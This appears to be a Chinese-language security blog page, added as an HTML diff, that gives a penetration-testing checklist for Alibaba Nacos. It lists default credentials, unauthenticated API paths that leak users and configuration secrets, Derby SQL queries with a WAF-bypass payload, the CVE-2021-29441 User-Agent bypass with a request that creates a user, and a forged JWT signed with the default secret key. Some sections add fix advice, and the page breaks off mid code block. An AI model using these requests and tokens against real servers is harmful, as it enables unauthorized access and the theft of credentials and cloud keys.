@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Nacos 漏洞 Checklist - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="Nacos 漏洞 Checklist" />
+<meta property="og:description" content="Nacos 漏洞 Checklist 一、前置知识 0x01 Nacos 概述 Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="Nacos 漏洞 Checklist"/>
+<meta name="twitter:description" content="Nacos 漏洞 Checklist 一、前置知识 0x01 Nacos 概述 Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/nacos-%E6%BC%8F%E6%B4%9E-checklist/" /><link rel="prev" href="http://example.org/netmizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/mysql-udf%E6%8F%90%E6%9D%83/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Nacos 漏洞 Checklist",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/nacos-%E6%BC%8F%E6%B4%9E-checklist\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  2349 ,
+        "url": "http:\/\/example.org\/nacos-%E6%BC%8F%E6%B4%9E-checklist\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Nacos 漏洞 Checklist</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2349 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一前置知识">一、前置知识</a>
+      <ul>
+        <li><a href="#0x01-nacos-概述">0x01 Nacos 概述</a></li>
+      </ul>
+    </li>
+    <li><a href="#二默认口令登录">二、默认口令登录</a></li>
+    <li><a href="#三可能存在的未授权-api">三、可能存在的未授权 API</a>
+      <ul>
+        <li><a href="#0x01-用户信息-api">0x01 用户信息 API</a></li>
+        <li><a href="#0x02-集群信息-api">0x02 集群信息 API</a></li>
+        <li><a href="#0x03-配置信息-api">0x03 配置信息 API</a></li>
+      </ul>
+    </li>
+    <li><a href="#四sql-注入风险">四、SQL 注入风险</a>
+      <ul>
+        <li><a href="#漏洞描述">漏洞描述</a></li>
+        <li><a href="#漏洞影响">漏洞影响</a></li>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+      </ul>
+    </li>
+    <li><a href="#五认证绕过用户创建-cve-2021-29441">五、认证绕过/用户创建 CVE-2021-29441</a>
+      <ul>
+        <li><a href="#漏洞描述-1">漏洞描述</a></li>
+        <li><a href="#影响版本">影响版本</a></li>
+        <li><a href="#漏洞复现-1">漏洞复现</a></li>
+        <li><a href="#修复建议">修复建议</a></li>
+      </ul>
+    </li>
+    <li><a href="#六secretkey-默认密钥-cnvd-2023674205">六、secret.key 默认密钥 CNVD-2023674205</a>
+      <ul>
+        <li><a href="#漏洞描述-2">漏洞描述</a></li>
+        <li><a href="#漏洞影响-1">漏洞影响</a></li>
+        <li><a href="#漏洞复现-2">漏洞复现</a></li>
+        <li><a href="#漏洞修复">漏洞修复</a></li>
+      </ul>
+    </li>
+    <li><a href="#七identitykeyvalue-默认值认证绕过">七、identity.key/value 默认值认证绕过</a>
+      <ul>
+        <li><a href="#漏洞描述-3">漏洞描述</a></li>
+        <li><a href="#漏洞影响-2">漏洞影响</a></li>
+        <li><a href="#漏洞复现-3">漏洞复现</a></li>
+        <li><a href="#漏洞修复-1">漏洞修复</a></li>
+      </ul>
+    </li>
+    <li><a href="#八nacos-集群-raft-反序列化漏洞">八、Nacos 集群 Raft 反序列化漏洞</a>
+      <ul>
+        <li><a href="#漏洞描述-4">漏洞描述</a></li>
+        <li><a href="#漏洞影响-3">漏洞影响</a></li>
+        <li><a href="#漏洞复现-4">漏洞复现</a></li>
+        <li><a href="#漏洞修复-2">漏洞修复</a>
+          <ul>
+            <li><a href="#通用修补建议">通用修补建议</a></li>
+            <li><a href="#临时修补建议">临时修补建议</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="nacos-漏洞-checklist">Nacos 漏洞 Checklist</h1>
+<h2 id="一前置知识">一、前置知识</h2>
+<h3 id="0x01-nacos-概述">0x01 Nacos 概述</h3>
+<p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
+<h2 id="二默认口令登录">二、默认口令登录</h2>
+<p>Nacos 默认帐户名密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nacos/nacos
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="三可能存在的未授权-api">三、可能存在的未授权 API</h2>
+<h3 id="0x01-用户信息-api">0x01 用户信息 API</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/auth/users?pageNo=1&amp;pageSize=9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x02-集群信息-api">0x02 集群信息 API</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x03-配置信息-api">0x03 配置信息 API</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=9&amp;tenant=&amp;search=accurate&amp;accessToken=&amp;username=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一接口在未授权的情况下可能会暴露 Spring、MySQL、Redis、Druid 等配置信息，若存在云环境、文件系统，还可能暴露 accessKey、secretKey 等。</p>
+<p>获取配置信息示例：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609161347780.png"
+        data-srcset="images/image-20230609161347780.png, images/image-20230609161347780.png 1.5x, images/image-20230609161347780.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609161347780.png"
+        title="image-20230609161347780" /></p>
+<p>获取ak、sk 示例：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609161814152.png"
+        data-srcset="images/image-20230609161814152.png, images/image-20230609161814152.png 1.5x, images/image-20230609161814152.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609161814152.png"
+        title="image-20230609161814152" /></p>
+<p>如果返回为 403 Forbidden，可以尝试 CNVD-2023674205 漏洞绕过限制。</p>
+<h2 id="四sql-注入风险">四、SQL 注入风险</h2>
+<h3 id="漏洞描述">漏洞描述</h3>
+<p>Nacos config server 中有未鉴权接口，执行 SQL 语句可以查看敏感数据，可以执行任意的 SELECT 查询语句。</p>
+<p>漏洞点位于 nacos-config 的com.alibaba.nacos.config.server.controller.ConfigOpsController。</p>
+<h3 id="漏洞影响">漏洞影响</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用derby数据库进行部署的Nacos
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞复现">漏洞复现</h3>
+<p>poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一些查询语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from users
+</span></span><span class="line"><span class="cl">select * from permissions
+</span></span><span class="line"><span class="cl">select * from roles
+</span></span><span class="line"><span class="cl">select * from tenant_info
+</span></span><span class="line"><span class="cl">select * from tenant_capacity
+</span></span><span class="line"><span class="cl">select * from group_capacity
+</span></span><span class="line"><span class="cl">select * from config_tags_relation
+</span></span><span class="line"><span class="cl">select * from app_configdata_relation_pubs
+</span></span><span class="line"><span class="cl">select * from app_configdata_relation_subs
+</span></span><span class="line"><span class="cl">select * from app_list
+</span></span><span class="line"><span class="cl">select * from config_info_aggr
+</span></span><span class="line"><span class="cl">select * from config_info_tag
+</span></span><span class="line"><span class="cl">select * from config_info_beta
+</span></span><span class="line"><span class="cl">select * from his_config_info
+</span></span><span class="line"><span class="cl">select * from config_info
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Bypass payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&amp;sql=/%0a*--/%25&amp;q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&amp;sql=%0afrom--/&amp;sql=/%0ausers
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="五认证绕过用户创建-cve-2021-29441">五、认证绕过/用户创建 CVE-2021-29441</h2>
+<h3 id="漏洞描述-1">漏洞描述</h3>
+<p>2020 年 12 月 29 日披露。在 Nacos 进行认证授权操作时，会判断请求的 User-Agent 是否为 ”Nacos-Server”，如果是的话则不进行任何认证。该配置为硬编码，通过该漏洞，攻击者可以获取到用户名密码等敏感信息，且可以进行任意操作，包括创建新用户并进行登录后操作。</p>
+<h3 id="影响版本">影响版本</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nacos &lt;= 2.0.0-ALPHA.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞复现-1">漏洞复现</h3>
+<p>访问 <code>/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</code> ，查看状态码是否为 200，且内容中是否包含 <code>pageItems</code>。通过该路由可查询 IP 地址、Nacos 端口、Nacos 版本、raftPort 等信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://your-ip:port/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过 <code>/nacos/v1/auth/users</code> 路由查询已有的用户列表及敏感信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://your-ip:port/nacos/v1/auth/users?pageNo=1&amp;pageSize=9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609142007526.png"
+        data-srcset="images/image-20230609142007526.png, images/image-20230609142007526.png 1.5x, images/image-20230609142007526.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609142007526.png"
+        title="image-20230609142007526" /></p>
+<p>此处需要注意，大部分企业的 Nacos 的 URL 为 <code>/v1/auth/users</code> ，而不是默认的  <code>/nacos/v1/auth/users</code>，即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/v1/auth/users?pageNo=1&amp;pageSize=9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试以 POST 方式创建新用户（whoami/whoami）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /v1/auth/users HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username=whoami&amp;password=whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609143031183.png"
+        data-srcset="images/image-20230609143031183.png, images/image-20230609143031183.png 1.5x, images/image-20230609143031183.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609143031183.png"
+        title="image-20230609143031183" /></p>
+<p>查看刚才创建的新用户，使用添加的新用户（whoami/whoami）进行登录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=9 HTTP/1.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609143105272.png"
+        data-srcset="images/image-20230609143105272.png, images/image-20230609143105272.png 1.5x, images/image-20230609143105272.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609143105272.png"
+        title="image-20230609143105272" /></p>
+<h3 id="修复建议">修复建议</h3>
+<ol>
+<li>修改 Nacos 的 application.properties 配置文件，开启服务身份识别功能，配置后访问 <code>/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9</code> 路由将返回 403 Forbidden。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 开启鉴权
+</span></span><span class="line"><span class="cl">nacos.core.auth.enabled=true
+</span></span><span class="line"><span class="cl">nacos.core.auth.enable.userAgentAuthWhite=false
+</span></span><span class="line"><span class="cl">nacos.core.auth.server.identity.key=YOUR-KEY
+</span></span><span class="line"><span class="cl">nacos.core.auth.server.identity.value=YOUR-VALUE
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>Nacos 注册及配置中心开启权限认证，编辑项目中的 bootstrap.yml 或 bootstrap.properties，修改 discovery 和 config 开启用户密码认证（用户名和密码不能带有 %、$ 等会被转义的特殊字符）。</li>
+</ol>
+<h2 id="六secretkey-默认密钥-cnvd-2023674205">六、secret.key 默认密钥 CNVD-2023674205</h2>
+<h3 id="漏洞描述-2">漏洞描述</h3>
+<p>2023 年 3 月 2 日披露。Alibaba Nacos 使用了固定的 secret.key 默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞。</p>
+<h3 id="漏洞影响-1">漏洞影响</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Alibaba Nacos &lt;= 2.2.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞复现-2">漏洞复现</h3>
+<p>在配置文件 conf/application.properties 中，默认硬编码 nacos.core.auth.plugin.nacos.token.secret.key 的值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nacos 使用 jwt token，算法为 HS256，将 secret.key 的默认值当作 secretKey，生成Signature。jwt token 的 Payload 为 subject（用户名）和 exp（有效期）。</p>
+<p>我们伪造一个 jwt token，Payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;sub&#34;: &#34;nacos&#34;,
+</span></span><span class="line"><span class="cl">  &#34;exp&#34;: 1696669333
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609155053114.png"
+        data-srcset="images/image-20230609155053114.png, images/image-20230609155053114.png 1.5x, images/image-20230609155053114.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609155053114.png"
+        title="image-20230609155053114" /></p>
+<p>伪造的 jwt token：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行验证，没有配置 jwt token 时，返回 403 Forbidden：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=9&amp;tenant=&amp;search=accurate&amp;accessToken=&amp;username= HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: your-ip
+</span></span><span class="line"><span class="cl">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230609155124566.png"
+        data-srcset="images/image-20230609155124566.png, images/image-20230609155124566.png 1.5x, images/image-20230609155124566.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230609155124566.png"
+        title="image-20230609155124566" /></p>
+<p>修改 Authorization头，配置 jwt token，返回 200 OK：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
